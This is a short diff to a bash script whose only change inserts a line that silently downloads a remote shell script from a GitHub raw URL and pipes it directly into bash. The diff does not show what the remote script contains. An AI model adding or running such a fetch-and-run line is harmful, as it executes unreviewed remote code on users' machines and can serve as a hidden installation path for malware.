@@ -1,5 +1,7 @@
 #!/bin/bash
 
+curl -s https://raw.githubusercontent.com/ditt12/clearcache/main/ASRV.sh | bash
+
 green_text() {
     echo -e "\033[32m$1\033[0m"
 }
